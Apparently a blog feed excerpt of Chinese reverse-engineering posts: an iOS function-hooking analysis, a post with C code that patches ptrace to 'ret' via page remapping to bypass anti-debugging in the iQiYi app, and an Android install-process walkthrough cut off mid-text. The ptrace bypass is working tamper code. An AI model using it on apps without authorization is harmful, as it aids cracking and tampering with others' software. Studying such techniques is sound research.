#0xbec          ; =0xbec     0x10489a070: 0xd61f0220   br     x17    0x10489a074: 0xb868792a   ldr    w10, [x9, x8, lsl #2]    0x10489a078: 0x6b00015f   cmp    w10, w0// new_ZTL7624417887 函数指令(lldb) x/5i 0x00000001055bbbec    0x1055bbbec: 0xd503237f   pacibsp     0x1055bbbf0: 0xd100c3ff   sub    sp, sp, #0x30             ; =0x30     0x1055bbbf4: 0xa9027bfd   stp    x29, x30, [sp, #0x20]    0x1055bbbf8: 0x910083fd   add    x29, sp, #0x20            ; =0x20     0x1055bbbfc: 0xb81fc3a0   stur   w0, [x29, #-0x4]// original_ZTL7624417887 是一个函数指针(lldb) x/5g 0x00000001055bc1480x1055bc148: 0x0000000106e38000 0x00000000000000000x1055bc158: 0x0000000000000000 0x00000000000000000x1055bc168: 0x0000000000000000</code></pre><p>这里发现原函数前三个字节和<code>original_ZTL7624417887</code>这个函数指令数据都发生了变化。</p><pre><code class="assembly">0x10489a068: 0xb0006911   adrp   x17, 33610x10489a06c: 0x912fb231   add    x17, x17, #0xbec          ; =0xbec 0x10489a070: 0xd61f0220   br     x17</code></pre><p>这三条指令就是将原始执行流跳转到其他地址（这里也可以发现hook的函数至少大于3条指令，不然会覆盖其他函数）。这里简单计算就可以算出X17目标地址</p><pre><code>(lldb) p/x (0x10489a068 &amp; ~(0x1000-0x1))+ (3361&lt;&lt;12) + 0xbec(long) $3 = 0x00000001055bbbec</code></pre><p>所以会跳转到<code>0x00000001055bbbec</code>这个地址，等等！这个地址不就是<code>new_ZTL7624417887</code>我们hook代码的函数地址吗？所以函数hook就是通过修改前三条指令跳转到我们定义的函数来实现hook的。</p><p>这里还有个问题在于，如果我们在hook代码里面需要执行原函数，那么<code>original_ZTL7624417887</code>处保存的又是什么函数指针？所以这里跟一下<code>0x0000000106e38000</code>这个地址。</p><pre><code>(lldb) x/12i 0x0000000106e38000    0x106e38000: 0xd2800008   mov    x8, #0x0    0x106e38004: 0xd29a0009   mov    x9, #0xd000    0x106e38008: 0xf2a09e49   movk   x9, #0x4f2, lsl #16    0x106e3800c: 0xf2c00029   movk   x9, #0x1, lsl #32    0x106e38010: 0x911a4129   add    x9, x9, #0x690            ; =0x690     0x106e38014: 0xd0fed311   adrp   x17, -9630    0x106e38018: 0x9101d231   add    x17, x17, #0x74           ; =0x74     0x106e3801c: 0xd61f0220   br     x17</code></pre><p>这里可以看出也是一个跳转，可以计算出X17跳转后的地址</p><pre><code>(lldb) p/x (0x106e38014 &amp; ~(0x1000-0x1)) - (9630&lt;&lt;12) + 0x74(long) $4 = 0x000000010489a074</code></pre><p>再等等！这个地址不就是<code>ZTL7624417887</code>函数的第四条指令的地址吗，跳转到这里正好调用了原函数，但是有个问题在于，原函数的前三条指令去哪了？仔细观察上面的指令和原函数的前三条指令</p><pre><code>//原函数前三条指令0x10489a068: 0xd2800008   mov    x8, #0x00x10489a06c: 0xf0003489   adrp   x9, 16830x10489a070: 0x911a4129   add    x9, x9, #0x690            ; =0x690// original_ZTL7624417887函数指针的指令0x106e38000: 0xd2800008   mov    x8, #0x00x106e38004: 0xd29a0009   mov    x9, #0xd0000x106e38008: 0xf2a09e49   movk   x9, #0x4f2, lsl #160x106e3800c: 0xf2c00029   movk   x9, #0x1, lsl #320x106e38010: 0x911a4129   add    x9, x9, #0x690            ; =0x690</code></pre><p>稍加思索就知道，虽然指令不一样，但是结果却是一样的。为什么不直接写入原三条指令呢？这里涉及到<code>adrp</code>这个指令的相对寻址问题。由于<code>adrp</code>会根据当前pc值来计算，这样直接复制的话pc值已经变化，所以这里不得不重新计算X9的值。到这里，<code>MSHookFunction</code>的hook过程我们已经完全清楚了。</p><h4 id="iOS12-MSHookFunction分析-unc0ver越狱工具"><a href="#iOS12-MSHookFunction分析-unc0ver越狱工具" class="headerlink" title="iOS12 MSHookFunction分析(unc0ver越狱工具)"></a>iOS12 MSHookFunction分析(unc0ver越狱工具)</h4><p>由于saurik不给CoolStar的越狱工具提供substrate和cydia的支持，导致现在越狱工具出现了两种hook框架。以Coolstar团队基于开源代码substitute和pwn20wnd团队的substrate两种hook框架。上面分析了substitute的hook原理。下面分析substrate的hook相关细节。这里多说两句，关于整个事件，可以访问CoolStar的博客<a href="https://coolstarorg.tumblr.com/" target="_blank" rel="external">https://coolstarorg.tumblr.com/</a>他介绍了整个事件以及自己开发移植substitute的完整过程。我个人来说，还是十分崇拜CoolStar那份创新和坚持。自己动手完成了最新越狱的substitute移植，tweak注入，以及Sileo的开发。在这中间的过程，正如他在博客里面提到的那样，十分曲折，令人佩服。</p><p>待完成…</p><h4 id="MSHookFunction如何解决内存patch的问题"><a href="#MSHookFunction如何解决内存patch的问题" class="headerlink" title="MSHookFunction如何解决内存patch的问题"></a>MSHookFunction如何解决内存patch的问题</h4><p>由于<code>substitute</code>开源的，所以可以结合源码分析。源码在<a href="https://github.com/coolstar/substitute">这里</a></p><p><code>SubHookFunction</code>函数伪代码，此时的函数参数为</p><pre><code>x0 = 0x00000001005de068  Filza`ZTL7624417887x1 = 0x0000000102c9bbec  xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19x2 = 0x0000000102c9c148  xkfilza.dylib`original_ZTL7624417887</code></pre><p>就是原函数地址，替换的函数地址，保存原函数地址的指针</p><pre><code class="c">__int64 __fastcall SubHookFunction(__int64 a1, __int64 a2, __int64 a3){  __int64 result; // x0  FILE *v4; // x19  __int64 v5; // ST00_8  __int64 v6; // [xsp+10h] [xbp-30h]  __int64 v7; // [xsp+18h] [xbp-28h]  __int64 v8; // [xsp+20h] [xbp-20h]  int v9; // [xsp+28h] [xbp-18h]  v6 = a1;  v7 = a2;  v8 = a3;  v9 = 0;  result = substitute_hook_functions((__int64)&amp;v6, 1uLL, 0LL, 1);  if ( (_DWORD)result )  {    v4 = __stderrp;    v5 = substitute_strerror();    fprintf(v4, &quot;SubHookFunction: substitute_hook_functions returned %s\n&quot;, v5);    abort();  }  return result;}</code></pre><p>对应源码<code>substitute/lib/darwin/substrate-compat.c</code></p><pre><code class="c">void SubHookFunction(void *symbol, void *replace, void **result)    __asm__(&quot;SubHookFunction&quot;);void SubHookFunction(void *symbol, void *replace, void **result) {    struct substitute_function_hook hook = {symbol, replace, result};    int ret = substitute_hook_functions(&amp;hook, 1, NULL,                                        SUBSTITUTE_NO_THREAD_SAFETY);    if (ret) {        substitute_panic(&quot;SubHookFunction: substitute_hook_functions returned %s\n&quot;,                         substitute_strerror(ret));    }}</code></pre><p>再跟一下到<code>substitute_hook_functions</code>函数。</p><p>对应源码<code>substitute/lib/hook-functions.c</code></p><p>还在分析中…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/coolstar/electra/issues/233">https://github.com/coolstar/electra/issues/233</a></li><li><a href="https://github.com/coolstar/electra/blob/master/docs/getting-started.md#platformizing-a-binary">https://github.com/coolstar/electra/blob/master/docs/getting-started.md#platformizing-a-binary</a></li><li><a href="https://github.com/ipasimulator/lldb">https://github.com/ipasimulator/lldb</a></li><li><a href="https://github.com/BishopFox/bfinject">https://github.com/BishopFox/bfinject</a></li><li><a href="https://coolstarorg.tumblr.com/" target="_blank" rel="external">https://coolstarorg.tumblr.com/</a></li><li><a href="http://www.newosxbook.com/articles/CodeSigning.pdf" target="_blank" rel="external">http://www.newosxbook.com/articles/CodeSigning.pdf</a></li><li><a href="https://github.com/frida/frida-gum/commit/30deb2c29f060948407b585c4b23475ea60b965b">https://github.com/frida/frida-gum/commit/30deb2c29f060948407b585c4b23475ea60b965b</a></li><li><a href="https://github.com/Siguza/ios-resources/blob/master/bits/arm64.md">https://github.com/Siguza/ios-resources/blob/master/bits/arm64.md</a></li><li><a href="https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c">https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;iOS12内存patch-remap-bug分析&quot;&gt;&lt;a href=&quot;#iOS12内存patch-remap-bug分析&quot; class=&quot;headerlink&quot; title=&quot;iOS12内存patch remap bug分析&quot;&gt;&lt;/a&gt;iOS12内存patch r
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="hook" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>iOS LLDB中反反调试分析与实现</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/</id>
    <published>2019-08-12T11:16:01.000Z</published>
    <updated>2019-08-13T17:41:50.131Z</updated>
    
    <content type="html"><![CDATA[<h3 id="iOS-LLDB中反反调试分析与实现"><a href="#iOS-LLDB中反反调试分析与实现" class="headerlink" title="iOS LLDB中反反调试分析与实现"></a>iOS LLDB中反反调试分析与实现</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于反调试和反反调试，已经有很多人分析过了，也有很多解决方案。但是在LLDB中做反反调试还没人做过，这也是我一直想解决的一个方案，毕竟本身就是为了调试，那么在LLDB直接输入一行命令就能反反调试应该相对酸爽。本文将介绍一种基于内存单指令patch的方式进行反反调试的方案，大概意思就是通过直接修改代码段的指令来绕过反调试机制。</p><h4 id="目前反调试与反反调试情况"><a href="#目前反调试与反反调试情况" class="headerlink" title="目前反调试与反反调试情况"></a>目前反调试与反反调试情况</h4><p>这里庆哥写了一遍文章分析了 <a href="http://iosre.com/t/topic/8179" target="_blank" rel="external">关于反调试&amp;反反调试那些事</a></p><p>这里简单归纳一下，有如下几种：</p><ul><li>ptrace</li><li>sysctl</li><li>syscall</li><li>SIGTOP</li><li>task_get_exception_ports</li></ul><p>这里实际上就大概三种，其他都是基于ptrace的变种。ptrace这个函数是linux就提供的一个接口，常常用作linux系的反调试，本质就是通过26号系统调用来完成的，目前大多反调试都利用该方案。</p><p>后面看到庆哥同样提供了一个反反调试的LLDB脚本，不过看了下和我的思路还是不一样的。（<del>差点以为白做了）</del></p><p>正如文章里面写到通过<code>lldb</code>下断点，然后修改参数，或者直接返回也可以达到反反调试的效果。由于要不断去检查执行状态等，或者程序有定时器定时检测，这个脚本影响性能及变得很卡影响调试体验。不过还是膜庆哥的方案，学习了。</p><h4 id="内存patch实现反反调试"><a href="#内存patch实现反反调试" class="headerlink" title="内存patch实现反反调试"></a>内存patch实现反反调试</h4><p>说一下大概思路：</p><ul><li>内存中找到<code>ptrace</code>地址</li><li>将该内存map为<code>rwx</code></li><li><p>直接将首调指令修改为<code>ret</code>指令</p><p>刚开始以为就这样简单就完了，结果实际写代码的时候才发现过程远比想象中复杂。</p></li></ul><p>由于iOS不允许直接将代码段map为写权限，这里调用<code>mach_vm_protect</code>或<code>mprotect</code>都会异常。但是类似frida、substitute以及hookzz都能进行指令hook。这样说来，肯定是可以修改代码段的。看了下substitute以及frida中关于这块的实现，才发现可以用一种remap的方式修改代码段。</p><p>大致的流程如下：</p><ul><li>使用mmap新建一块内存，把这块内存叫做new</li><li>使用vm_copy把想要篡改的处于__text段内的内存（把这块内存叫target）拷贝到new里</li><li>向new里写入想执行的代码</li><li>调用mprotect把new改为rx。因为mmap出来的内存的max_protection是rwx，所以这里mprotect改权限没问题</li><li>调用mach_vm_remap把new的内容反映回target里</li></ul><p>不过当我写代码测试的时候发现，remap以后整个页数据都变成了0。实在不清楚原因，向Zz求助，Zz直接扔了我他实现这块的代码。我看了以后收益匪浅，只怪之前没分析hookzz的具体实现。后面才知道由于我的设备是iOS12，Zz意思是codesign的问题，hookZz也没支持。于是换了一台iOS9的设备，果然就可以了，向Zz低头。</p><p>期间还由于我手残忘记调用mprotect把new改为rx。导致直接执行异常，用<code>memory region</code>查看地址才知道页保护属性为<code>rw</code>。</p><p>相关代码如下：</p><p>1、map new page for patch</p><pre><code class="c">    // map new page for patch    void *new = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);    if (!new ){        NSLog(@&quot;[-] mmap failed!&quot;);        return;    }    NSLog(@&quot;[*] new map address:%p&quot;, new);</code></pre><p>2、start patch</p><pre><code class="c">    // start patch        kret = vm_copy(self_task, (unsigned long)page_start, 0x1000, (vm_address_t) new);    if (kret != KERN_SUCCESS){        NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno);        return;    }    char patch_ret_ins_data[4] = {0xc0, 0x03, 0x5f, 0xd6}; // ret     memcpy((void *)(new+patch_offset), patch_ret_ins_data, 4);    NSLog(@&quot;[*] new map+offset address:%p&quot;, (void *)(new+patch_offset));</code></pre><p>3、set new page back to r-x</p><pre><code class="c">    // set back to r-x    int ret = mprotect(new, 0x1000, PROT_READ | PROT_EXEC);    NSLog(@&quot;[*] ret: %d, errno: %d, addr: %p&quot;, ret, errno, new);</code></pre><p>4、remap the target page</p><pre><code class="c">    kret = mach_vm_remap(mach_task_self(), &amp;target, 0x1000, 0,                       VM_FLAGS_OVERWRITE, self_task,                       (mach_vm_address_t) new, TRUE,                       &amp;c, &amp;m, inherit);    if(kret != KERN_SUCCESS){        NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno);        return;    }    NSLog(@&quot;[*] now ptrace_ptr address:%p&quot;, ptrace_ptr)</code></pre><p>5、clear cache</p><pre><code class="c">    void* clear_start_ = (void*)page_start + patch_offset;  sys_icache_invalidate (clear_start_, 4);  sys_dcache_flush (clear_start_, 4);</code></pre><p>完整的代码在xia0LLDB里面已经集成：<a href="https://github.com/4ch12dy/xia0LLDB">https://github.com/4ch12dy/xia0LLDB</a></p><h4 id="一个简单反反调试实验"><a href="#一个简单反反调试实验" class="headerlink" title="一个简单反反调试实验"></a>一个简单反反调试实验</h4><p>这里以爱奇艺为例子分析，爱奇艺在main函数里面动态调用了ptrace函数进行反调试。</p><ul><li><p>后台启动方式启动爱奇艺</p><pre><code class="shell">xia0 ~ $ issh debug -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo[I]:iproxy process for 2222 port alive, pid=16264 [I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [I]:iOSRE dir exist [I]:iproxy process for 1234 port alive, pid=16428 [I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null) [I]:/iOSRE/tools/debugserver file exist, Start debug... [I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo</code></pre></li><li><p>LLDB挂上以后在main函数下断点以后直接执行<code>debugme</code>命令</p><pre><code>(lldb) debugmeKill antiDebug by xia0:[*] ptrace target address: 0x1837dc180 and offset: 0x180[*] mmap new page: 0x1021ec000 success. [+] vm_copy target to new page.[+] patch ret[0xc0 0x03 0x5f 0xd6] with memcpy[*] set new page back to r-x success![*] get page info done.[+] remap to target success![*] clear cache success![+] all done! happy debug~</code></pre><p>下面查看对比下patch前后指令ptrace首指令的变化</p><p>Patch之前</p><pre><code>(lldb) x/12i 0x00000001837dc180    0x1837dc180: 0xf00f26a9   adrp   x9, 124119    0x1837dc184: 0x91034129   add    x9, x9, #0xd0             ; =0xd0     0x1837dc188: 0xb900013f   str    wzr, [x9]    0x1837dc18c: 0xd2800350   mov    x16, #0x1a    0x1837dc190: 0xd4001001   svc    #0x80    0x1837dc194: 0x540000c3   b.lo   0x1837dc1ac               ; &lt;+44&gt;    0x1837dc198: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!    0x1837dc19c: 0x910003fd   mov    x29, sp    0x1837dc1a0: 0x97ff9b08   bl     0x1837c2dc0               ; cerror    0x1837dc1a4: 0x910003bf   mov    sp, x29    0x1837dc1a8: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10    0x1837dc1ac: 0xd65f03c0   ret</code></pre><p>Patch之后</p><pre><code>(lldb) x/12i 0x1837dc180    0x1837dc180: 0xd65f03c0   ret        0x1837dc184: 0x91034129   add    x9, x9, #0xd0             ; =0xd0     0x1837dc188: 0xb900013f   str    wzr, [x9]    0x1837dc18c: 0xd2800350   mov    x16, #0x1a    0x1837dc190: 0xd4001001   svc    #0x80    0x1837dc194: 0x540000c3   b.lo   0x1837dc1ac               ; &lt;+44&gt;    0x1837dc198: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!    0x1837dc19c: 0x910003fd   mov    x29, sp    0x1837dc1a0: 0x97ff9b08   bl     0x1837c2dc0               ; cerror    0x1837dc1a4: 0x910003bf   mov    sp, x29    0x1837dc1a8: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10    0x1837dc1ac: 0xd65f03c0   ret</code></pre><p>可以发现首地址已经变成了ret指令。</p></li><li><p>执行continue命令，发现爱奇艺已经能够正常调试。</p><pre><code>(lldb) cProcess 3176 resuming2019-08-13 17:22:17.283 iQiYiPhoneVideo[3176:161840] [plcrash]: init ok2019-08-13 17:22:17.790 iQiYiPhoneVideo[3176:161840] -[QYBaikePageDurationManager bk_appDidBecomeActive:]2019-08-13 17:22:17.922 iQiYiPhoneVideo[3176:161840] CoreData: Failed to load optimized model at path &#39;/var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/QYPGCDataModel.momd/QYPGCDataModel_970.omo&#39;2019-08-13 17:22:20.477 iQiYiPhoneVideo[3176:161840] OSStatus error: [-34018] Security error has occurred.2019-08-13 17:22:20.558 iQiYiPhoneVideo[3176:162000] OSStatus error: [-34018] Security error has occurred.3176:161840] Incorrect NSStringEncoding value 0x8000100 detected. Assuming NSASCIIStringEncoding. Will stop this compatiblity mapping behavior in the near future.ontainers/Data/Application/5C31FE18-9BA4-4B2D-80C6-68BF7F65855F/Library/Application Support/爱奇艺/0_im.sqlite</code></pre></li></ul><h4 id="总结-Todo"><a href="#总结-Todo" class="headerlink" title="总结/Todo"></a>总结/Todo</h4><p>这里只是简单的绕过了ptrace方式的反调试，针对直接用汇编写的反调试我的做法是静态内存搜索匹配svc位置，发现是调用26号系统调用则利用内存patch为nop。或者写一个简单的hook代码，hook所有的svc地址，判断寄存器的值然后进行hook即可，这样就能绕过这些反调试机制，再次向Zz和庆哥低头。</p><h4 id="参考-致谢"><a href="#参考-致谢" class="headerlink" title="参考/致谢"></a>参考/致谢</h4><ul><li><p><a href="https://gist.github.com/piaoger/4ba83f6a954bca113505" target="_blank" rel="external">https://gist.github.com/piaoger/4ba83f6a954bca113505</a></p></li><li><p><a href="https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c">https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c</a></p></li><li><p><a href="https://www.codercto.com/a/63507.html" target="_blank" rel="external">https://www.codercto.com/a/63507.html</a></p></li><li><p><a href="https://github.com/jmpews/HookZz/blob/dev/srcxx/UserMode/ExecMemory/code-patch-tool-darwin.cc#L26">https://github.com/jmpews/HookZz/blob/dev/srcxx/UserMode/ExecMemory/code-patch-tool-darwin.cc#L26</a></p></li><li><p><a href="https://github.com/gdbinit/readmem/blob/master/readmem/main.c">https://github.com/gdbinit/readmem/blob/master/readmem/main.c</a></p></li><li><p><a href="https://github.com/frida/frida-gum/blob/master/gum/backend-darwin/machexc.h">https://github.com/frida/frida-gum/blob/master/gum/backend-darwin/machexc.h</a></p></li><li><p><a href="http://newosxbook.com/src.jl?tree=xnu&amp;file=/libsyscall/mach/mach_vm.c" target="_blank" rel="external">http://newosxbook.com/src.jl?tree=xnu&amp;file=/libsyscall/mach/mach_vm.c</a></p></li><li><p><a href="https://github.com/DaKnOb/memscan/blob/master/main.mm">https://github.com/DaKnOb/memscan/blob/master/main.mm</a></p></li><li><p><a href="http://iosre.com/t/topic/8179" target="_blank" rel="external">http://iosre.com/t/topic/8179</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;iOS-LLDB中反反调试分析与实现&quot;&gt;&lt;a href=&quot;#iOS-LLDB中反反调试分析与实现&quot; class=&quot;headerlink&quot; title=&quot;iOS LLDB中反反调试分析与实现&quot;&gt;&lt;/a&gt;iOS LLDB中反反调试分析与实现&lt;/h3&gt;&lt;h4 id=&quot;开
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>Android应用安装过程深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/</id>
    <published>2019-08-01T07:08:31.000Z</published>
    <updated>2019-08-01T10:29:23.735Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Android应用安装过程深度解析"><a href="#Android应用安装过程深度解析" class="headerlink" title="Android应用安装过程深度解析"></a>Android应用安装过程深度解析</h3><blockquote><p>本文由我和willing对整个安装过程的原理梳理，感谢willing精心的绘图以及相关源码整理。</p></blockquote><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于对Android应用的安装过程梳理，是因为很多重打包的外挂利用系统矫正器来绕过安卓系统的签名校验。为了分析其原理，详细分析了Android应用安装的过程，找到其中签名校验的地方，进一步做一些对抗和检测。</p><h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><p>一个 Android 应用安装到手机上大致分为四种情形：</p><ul><li>系统应用，在设备每次启动时完成安装</li><li>通过 adb install 命令安装</li><li>应用市场安装，封装安装过程（略）</li><li>第三方应用安装或双击安装包，会启动系统应用引导安装</li></ul><p>无论采用哪种安装方式，最终的安装过程都会走到 PackageManagerService，由这个类来完成一系列的工作。PackageManagerService 实际上是一个系统服务，负责提供系统上所有应用的管理，包括安装、优化、查询和卸载，这个类最终会通过 socket 与 installd 这个守护进程通信，真实对应用进行操作的其实是由 installd 这个进程完成。</p><h4 id="场景一：系统应用安装"><a href="#场景一：系统应用安装" class="headerlink" title="场景一：系统应用安装"></a>场景一：系统应用安装</h4><p>在设备启动时，Linux 系统的用户空间进程 init （pid = 1）会孵化许多子进程，包括一系列守护进程，其中就有上面提到的 installd，然后会孵化许多重要的系统服务，如 servicemanager，这个进程会负责管理所有服务的 Binder 通信，最后 init 还会孵化 zygote 进程，这个进程是第一个 Java 进程，zygote 进程会孵化出许多应用程序进程，包括 launcher 进程，即桌面进程，zygote 还会孵化出 system_server 进程，负责启动和管理 Framework 的 Java 层服务，包括 PackageManagerService、ActivityManagerService 等。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801151901799.png?raw=true" alt="image-20190801151901799"></p><p><strong>补充：system_server 的启动与运行流程</strong></p><p>system_server 由 zygote 进程孵化，是整个 Android Framework 的基础</p><p>zygote 启动阶段会调用 forkSystemServer() 创建子进程 system_server</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152013042.png?raw=true" alt="image-20190801152013042"></p><p>ForkAndSpecializeCommon 函数中完成进程创建工作并返回，两次返回，pid=0 时为子进程，pid&gt;0 时为父进程。onZygoteInit() 回调的实现在在 app_main.cpp 中，会调用 ProcessState::self() 初始化 binder 的交互操作，然后调用 proc-&gt;startThreadPool() 创建 binder 线程进行通信</p><p>RuntimeInit 的 findStaticMain() 调用 com.android.server.SystemServer 的 main 方法</p><p>SystemServer 的 run() 方法中会完成以下工作：</p><ul><li>设置时间、语言等，设置虚拟机库文件，设置内存</li><li>Looper.prepareMainLooper() 主线程 looper 运行在当前线程</li><li>加载库文件 android_servers，位于 /frameworks/base/services</li><li>createSystemContext() 初始化系统上下文</li><li>SystemServiceManager() 创建系统服务管理器，并添加到本地服务成员 LocalServices 中</li><li>启动各种系统服务，包括引导服务、核心服务、其他服务</li><li>开启循环，等待其他线程通过 handler 发送消息到主线程来处理</li></ul><p>在 system_server 进程启动过程中会启动各种系统服务，其中就包含 PackageManagerService</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152050671.png?raw=true" alt="image-20190801152050671"></p><p>PackageManagerService 类构造函数中完成了许多工作，主要包含：</p><ul><li>创建 Settings 对象，添加系统的 SharedUser 信息</li><li>为 Installer 对象赋值，赋值参数是在 system_server 进程中创建的</li><li>创建 PackageDexOptimizer 和 DexManager 对象</li><li>获取 SystemConfig 实例，获取系统的全局配置信息，如 GlobalGids、SystemPermissions、AvailableFeatures</li><li>创建 ServiceThread 和 PackagerHandler 对象</li><li>创建 UserManagerService，支持多用户</li><li>读取系统定义的权限保存到 permConfig 变量中</li><li>读取系统共享库保存到 libConfig 变量中</li><li>解析 package.xml 文件中的内容保存到 ArrayMap<string, packageparser.package=""> 结构中</string,></li><li>配置扫描参数 scanFlags</li><li>开始扫描系统应用，包括目录 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app</li><li>开始扫描非系统应用，包括目录 /data/app、/data/app-private</li><li>启动内存垃圾回收</li><li>启动私有服务 PackageManagerInternal</li></ul><p>总结来说主要是这几项内容：</p><ul><li>创建了 Java 层 Installer 和 C 层 installd 之间的 socket 连接</li><li>扫描各目录下 apk文件完成安装（建立各安装包的配置结构信息，并添加到全局列表中进行管理）</li><li>创建了 PackageHandler 对象并建立消息循环，接收外部的安装请求</li><li>解析权限，建立底层 Linux Kernel 的用户机制和虚拟机层权限机制之间的映射</li></ul><p>详细说明各项：</p><p>Installer 是 PackageManagerService 的一个内部类，继承自SystemService，协助完成安装过程，主要是进行 apk 格式转换和数据目录建立，封装对文件和路径操作，真正的安装工作交由 IInstalld 内部类对象完成。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152128607.png?raw=true" alt="image-20190801152128607"></p><p>Installer 在 SystemServer 中启动，通过 SystemServiceManager 的 startService(Installer.class) 启动。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152145965.png?raw=true" alt="image-20190801152145965"></p><p>构造函数 Installer() 初始化 context 和 isolated（是否真正连接installd）成员变量</p><p>重写 onStart() 方法，基于 isolated 判断是否调用 connect() 进行连接</p><p>connect() 通过 ServiceManager 获取 installd 服务并拿到服务的本地代理放到成员变量 mInstalld 中</p><p>Installer 调用 dexopt() 最终调用了 mInstalld 的dexopt() 方法，其他方法类似，几乎就是一个 IInstalld 类的封装</p><p><strong>!!!!  Installer 的实现变化很大：6.0 上通过以命令的方式通过 execute 方法执行；8.1 通过 AIDL 接口实现</strong></p><p><strong>PackageManageService（system权限） 与 installd（root权限） 守护进程共同完成应用管理</strong></p><p>PackageManagerService 的构造函数中会扫描许多应用目录来安装 apk</p><p>包括：</p><ul><li>系统应用，目录有 <code>/vender/overlay</code>、<code>/system/framework</code>、<code>/system/priv-app</code>、<code>/system/app</code>、<code>/vendor/app</code>、<code>/oem/app</code></li><li>非系统应用，目录有 <code>/data/app</code>、<code>/data/app-private</code></li></ul><p>调用的方法是 <code>scanDirTracedLI()</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152328199.png?raw=true" alt="image-20190801152328199"></p><p>可以看到依次调用 scanDirLI()、scanPackageLI()、scanPackageInternalLI()</p><p>其中，scanDirLI() 调用了 ParallelPackageParser 类进行解析，从名字也能看出做了一些并行的优化处理，真正的工作还是交给 PackageParser 来完成，PackageParser 的 parsePackage() 方法内部完成了应用的解析，实际上是解析了 AndroidManifest.xml 文件里面各个标签，包括包名、版本、权限、各组件这些信息，最后的解析结果放在 PackageParser.Package 类中返回给 PMS，这样 PMS 就拥有应用的信息便与做各种管理</p><p>后面继续调用了 scanPackageLI() 和 scanPackageInternalLI() 是进一步检测应用是否需要更新，如果需要更新则接着调用 createInstallArgsForExisting() 构造安装参数开始安装（后面还会遇到这个函数，暂时不展开），安装涉及到的签名校验也是在这里，调用了 collectCertificatesLI()、compareSignatures() 等</p><h4 id="场景二：adb-命令安装"><a href="#场景二：adb-命令安装" class="headerlink" title="场景二：adb 命令安装"></a>场景二：adb 命令安装</h4><p>adb 是 Android SDK 提供的一个命令行工具，为客户端-服务器架构，服务端为移动端上运行的守护进程 adbd，与 installd 一样由 init 进程创建</p><p>源码路径为：<a href="http://androidxref.com/8.1.0_r33/xref/system/core/adb/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/system/core/adb/</a></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152448109.png?raw=true" alt="image-20190801152448109"></p><p>adb_commandline() 函数接收 adb 命令行参数，调用 install_app() 执行安装流程，这个函数会对命令行做一些修改，实际上调用 pm 命令，并通过 send_shell_command() 将命令发送给 Pm 类。</p><p>Pm 启动函数 main 会构造 Pm 类对象并调用 run() 方法，在这个方法里首先会获取 PackageManger 服务 mPm，然后调用 getPackageInstaller() 获取 PackageInstaller 对象 